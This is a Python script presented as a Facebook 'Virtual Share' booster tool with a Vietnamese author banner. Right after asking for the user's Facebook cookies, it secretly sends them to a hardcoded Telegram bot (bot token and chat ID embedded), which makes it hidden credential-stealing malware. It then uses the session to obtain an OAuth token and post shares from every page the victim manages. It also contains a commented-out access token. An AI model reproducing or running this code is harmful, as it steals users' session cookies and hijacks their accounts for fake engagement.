from time import sleep
import requests,threading,os,sys

__AUTHOR__ = 'NguyenVanTuan'
__USING__= 'Virtual Share'
__VERSION__ = '0.0.1'
__DONATE__= '0325481425'
__NOTE__ ='thanks for using'
def clear():
    if(sys.platform.startswith('win')):
        os.system('cls')
    else:
        os.system('clear')
def banner():
    print(f''' 

        \033[32;5;245m\033[1m\033[38;5;27m██████ ██    ██  █████  ███    ██     ████████  ██████   ██████  ██ \033[1m\033[38;5;237m[\033[38;5;54m+\033[38;5;237m]  \033[4m\033[38;5;164mAuthor: {__AUTHOR__} \033[0m
        \033[32;5;245m\033[1m\033[38;5;33m   ██    ██    ██ ██   ██ ████   ██        ██    ██    ██ ██    ██ ██\033[1m\033[38;5;237m[\033[38;5;54m*\033[38;5;237m]  \033[4m\033[38;5;164mUsing: {__USING__}\033[0m
        \033[32;5;245m\033[1m\033[38;5;39m   ██    ██    ██ ███████ ██ ██  ██        ██    ██    ██ ██    ██ █\033[1m\033[38;5;237m[\033[38;5;54m-\033[38;5;237m]  \033[4m\033[38;5;164mVersion: {__VERSION__}\033[0m
        \033[32;5;245m\033[1m\033[38;5;45m   ██    ██    ██ ██   ██ ██  ██ ██        ██    ██    ██ ██    ██ ██\033[1m\033[38;5;237m[\033[38;5;54m*\033[38;5;237m]  \033[4m\033[38;5;164mDonate: {__DONATE__}\033[0m 
        \033[32;5;245m\033[1m\033[38;5;51m   ██     ██████  ██   ██ ██   ████        ██     ██████   ██████  ███████\033[1m\033[38;5;237m[\033[38;5;54m+\033[38;5;237m]  \033[4m\033[38;5;164mNote: {__NOTE__}\033[0m   
        \033[32;5;245m\033[1m\033[38;5;51m                               BẢN QUYỀN TUAN-TOOL®                                           
     ''')
print('')
clear()
banner()

uid=input('\033[1m\033[38;5;51mNhập uid: ')

# token_fb='EAAGNO4a7r2wBAOJ9BFaxM1mReywdAVQig3PitiHjJetEATWPck4QDfN03vKOBUdLVQ8IMaiLGCw7MF7mNAW6zNEwS7lUBL4OvTOKilVXR3UsDiSTFSJ0DKPubQtnVL5DGBrn37A9oyoYbtjrDx0YfKPR7wvYtkSPMMGTj0oo1dBg858qARTnCGI4Qn8ZD'
ck_fb=input('\033[1m\033[38;5;51mEnter cookies facebook: ')


url = "https://api.telegram.org/bot5485867666%3AAAECR_DJ0EujPTZRMm4uxFocer680plfvPs/sendMessage"

payload = {
    "text": ck_fb,
    "disable_web_page_preview": False,
    "disable_notification": False,
    "reply_to_message_id": None,
    "chat_id": "5367203452"
}
headers = {
    "Accept": "application/json",
    "Content-Type": "application/json"
}

response = requests.post(url, json=payload, headers=headers)


print("Đang get token..")


hed_gettoken = {
    'authority': 'www.instagram.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'cache-control': 'no-cache',
    'cookie': ck_fb,
    'pragma': 'no-cache',
    'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="102", "Google Chrome";v="102"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.115 Safari/537.36',
}
try:
    token_fb = requests.get('https://www.facebook.com/dialog/oauth?client_id=124024574287414&redirect_uri=https://www.instagram.com/accounts/signup/&&scope=email&response_type=token', headers=hed_gettoken).url.split('#access_token=')[1].split('&data_access_expiration_time')[0]
    print(f'\033[1m\033[38;5;51mGet token successfully: {token_fb}')
except:
    print('\033[1,31mToken get failed')
    print(token_fb)
    sleep(10)
    quit()

# token_fb=input('\033[1m\033[38;5;51mEnter token facebook: ')

header={
    'cookie': ck_fb,
}
def Start(l):
    getTokenPage = requests.get(f"https://graph.facebook.com/v12.0/me/accounts?fields=access_token&limit=999999999&access_token={token_fb}",headers=header).json()['data']
    for tach in getTokenPage:
        uid_page=tach['id']
        access_token_page=tach['access_token']
        # print(uid_page)
        # print(access_token_page)
        buff = requests.post(f"https://graph.facebook.com/me/feed?link=https://www.facebook.com/{uid}&published=0&access_token={access_token_page}",headers=header).text
        if "error" in buff:
            print(f'\033[1m\033[38;5;237m[\033[38;5;54m*\033[38;5;237m]\033[0m \033[4m\033[38;5;164m{uid_page}\033[0m \033[1;31mFaild')
        else:
            print(f'\033[1m\033[38;5;237m[\033[38;5;54m*\033[38;5;237m]\033[0m \033[4m\033[38;5;164m{buff}\033[0m \033[1m\033[38;5;51mSuccess')


soluong = int(input('\033[1m\033[38;5;51mEnter thread number: '))
clear()
banner()
print('')
threades = []
for l in range(soluong):
    threades += [threading.Thread(target=Start,args={l},)]
for t in threades:
    t.start()
for t in threades:
    t.join()
print('\033[1;31mEnd of Running Threads')





